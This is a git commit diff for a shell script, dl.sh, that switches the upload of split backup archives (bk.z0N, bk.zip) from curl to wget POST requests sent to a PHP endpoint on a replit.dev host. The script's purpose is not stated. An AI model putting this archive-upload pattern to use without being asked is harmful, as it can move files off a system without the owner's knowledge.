3349c31ff79da4603b4fc29eb4ac379f48496be9
Nam Nguyen <nam85it@gmail.com>
2025-07-11 17:05:11 +0700

    Update

--- dl.sh
+++ dl.sh
@@ -12,8 +12,9 @@ for ((i=1; i<=num_zip_files-1; i++)); do
     zip_file="bk.z0${i}"
     echo "Processing $zip_file..."
     # Sending the zip file using curl
-    curl -X POST -F "file=@${zip_file}" https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
+    #curl -X POST -F "file=@${zip_file}" https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
+    wget --method=POST --body-file=${zip_file} https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
 done
-curl -X POST -F "file=@bk.zip" https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
-
+#curl -X POST -F "file=@bk.zip" https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
+wget --method=POST --body-file=bk.zip https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
 echo "Finished processing $num_zip_files zip files."
